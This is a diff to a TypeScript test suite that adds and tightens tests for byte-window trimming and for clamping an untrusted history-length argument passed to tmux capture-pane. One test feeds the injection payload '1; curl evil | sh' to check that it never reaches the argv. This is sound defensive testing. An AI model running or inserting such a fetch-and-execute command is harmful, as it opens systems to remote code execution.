@@ -42,6 +42,11 @@ describe('trimToBytes', () => {
     expect(out).not.toContain('aaaa')
     expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(10)
   })
+  it('drops the partial first line when the byte window starts mid-line', () => {
+    // A 12-byte window over 15 bytes starts at 'a\nbbbb\ncccc\n' — the head line is partial and
+    // must be dropped whole, not emitted as 'a'.
+    expect(trimToBytes('aaaa\nbbbb\ncccc\n', 12)).toBe('bbbb\ncccc\n')
+  })
   it('never splits a 2-byte character (cap lands mid-character)', () => {
     // 'ü' is 2 bytes; a cap of 9 slices the 100-byte buffer mid-character.
     const out = trimToBytes('ü'.repeat(50), 9)
@@ -93,22 +98,35 @@ describe('PtyManager.captureHistory (untrusted `lines`)', () => {
     return pm
   }
 
+  // The `-S` OPERAND is the only untrusted slot: `-1` is always present as the `-E` operand, so
+  // assert positionally (a `toContain('-1')` would pass even with the clamp deleted).
+  const historyOperand = (call: number): string => {
+    const args = execFileCalls[call].args
+    return args[args.indexOf('-S') + 1]
+  }
+
   it('never lets a shell-injection payload reach the tmux argv', async () => {
     await withTmux().captureHistory('n1', '1; curl evil | sh' as unknown as number)
     const argv = execFileCalls[0].args.join(' ')
     expect(argv).not.toContain('curl')
     expect(argv).not.toContain(';')
-    expect(argv).toContain('-S')
-    expect(execFileCalls[0].args).toContain('-5000')
+    expect(historyOperand(0)).toBe('-5000')
   })
 
   it('clamps negative / NaN / oversized values to a sane integer', async () => {
     const pm = withTmux()
     await pm.captureHistory('n1', -1)
-    expect(execFileCalls[0].args).toContain('-1')
+    expect(historyOperand(0)).toBe('-1') // floored to 1 line; without the clamp this would be `--1`
     await pm.captureHistory('n1', NaN)
-    expect(execFileCalls[1].args).toContain('-5000')
+    expect(historyOperand(1)).toBe('-5000')
     await pm.captureHistory('n1', 10_000_000)
-    expect(execFileCalls[2].args).toContain('-5000')
+    expect(historyOperand(2)).toBe('-5000')
+    await pm.captureHistory('n1', 12.9)
+    expect(historyOperand(3)).toBe('-12')
+  })
+
+  it('keeps the exact capture command shape on the local path', async () => {
+    await withTmux().captureHistory('n1', 200)
+    expect(execFileCalls[0].args.join(' ')).toContain('capture-pane -p -e -t nt-n1 -S -200 -E -1')
   })
 })
